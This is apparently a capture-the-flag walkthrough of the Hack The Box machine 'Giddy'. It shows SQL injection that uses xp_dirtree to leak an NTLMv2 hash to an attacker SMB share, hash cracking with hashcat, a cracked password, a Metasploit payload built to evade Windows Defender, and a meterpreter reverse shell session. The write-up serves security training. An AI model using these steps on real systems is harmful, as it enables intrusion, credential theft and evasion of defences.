nmap scan:

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2020-12-17T18:51:08+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2020-12-17T18:50:35+00:00
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2020-12-16T18:44:56
|_Not valid after:  2021-06-17T18:44:56
|_ssl-date: 2020-12-17T18:51:08+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enumerating port 80

We have a website with just an image, I'll run gobuster to find hidden directories:

```
sudo gobuster -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.104 -t 50
/remote (Status: 302)
/mvc (Status: 301)
```

`/remote`:

![image1](/assets/images/htb-giddy/giddy1.png)

After connecting with https:

![image2](/assets/images/htb-giddy/giddy2.png)

`mvc`:

![image3](/assets/images/htb-giddy/giddy3.png)

Here we have a search form:

![image4](/assets/images/htb-giddy/giddy4.png)

If I send a `'` to test sql injection I get this error:

![image5](/assets/images/htb-giddy/giddy5.png)

The requests would be like this:

```
SELECT * FROM products WHERE name LIKE 'a' 
```

And when I add a `'`:

```
SELECT * FROM products WHERE name LIKE 'a''
```

That's why we get the error, now for exploiting this we are going to try to connect the mssql server to our smb share and with responder get the NTLMv2 hash:

### Exploiting the sql injection to get the NTLMv2 hash with responder

I'm going to exploit it using the `?ProductSubCategoryId` query because it's easier to read and it's vulnerable to sql injection too, we are going to use this:

```
declare @q varchar(100);
set @q='\\10.10.14.11\share';
exec master.dbo.xp_dirtree @q;
```

And we send it url encoded 

![image6](/assets/images/htb-giddy/giddy6.png)

Then start the responder with:

```
sudo python2 Responder.py -I tun0
```

and we have the hash:

![image7](/assets/images/htb-giddy/giddy7.png)

Now with hashcat I cracked the password using this command:

```
.\hashcat.exe -m 5600 .\hash.txt .\rockyou.txt
```

And the password is: `xNnWo6272k7x`

### Enumeration of the privesc vector

Now I'll log in with the credentials in `/remote`:

![image8](/assets/images/htb-giddy/giddy8.png)

We have a shell as stacy and on the `documents` folder has `unifivideo`:

![image9](/assets/images/htb-giddy/giddy9.png)

Unifivideo has an [exploit](https://www.exploit-db.com/exploits/43390) that permits us privesc.

For this we are going to generate a meterpreter reverse shell that evades the Windows Defender (the normal one doesn't work).

### Generating a reverse shell that evades the Windows Defender

```
msf6 > use evasion/windows/windows_defender_exe
msf6 evasion(windows/windows_defender_exe) > set lhost tun0
msf6 evasion(windows/windows_defender_exe) > set lport 9001
msf6 evasion(windows/windows_defender_exe) > run 
```

Now copy the file to a location and in that location start a smb share:

```
sudo python3 /opt/impacket/examples/smbserver.py share .
```

### Getting the reverse shell as administrator

Next on the windows shell download the file:

![image10](/assets/images/htb-giddy/giddy10.png)

Rename it to: `taskkill.exe`:

![image11](/assets/images/htb-giddy/giddy11.png)

Start a handler with metasploit with the meterpreter reverse shell

Now start and stop the service:

![image12](/assets/images/htb-giddy/giddy12.png)

And I get the shell back:

```
msf6 exploit(multi/handler) > run                                      
[*] Started reverse TCP handler on 10.10.14.11:9001                             
[*] Sending stage (175174 bytes) to 10.10.10.104                       
[*] Meterpreter session 1 opened (10.10.14.11:9001 -> 10.10.10.104:50021) at 2020-12-19 13:58:26 -0800
```
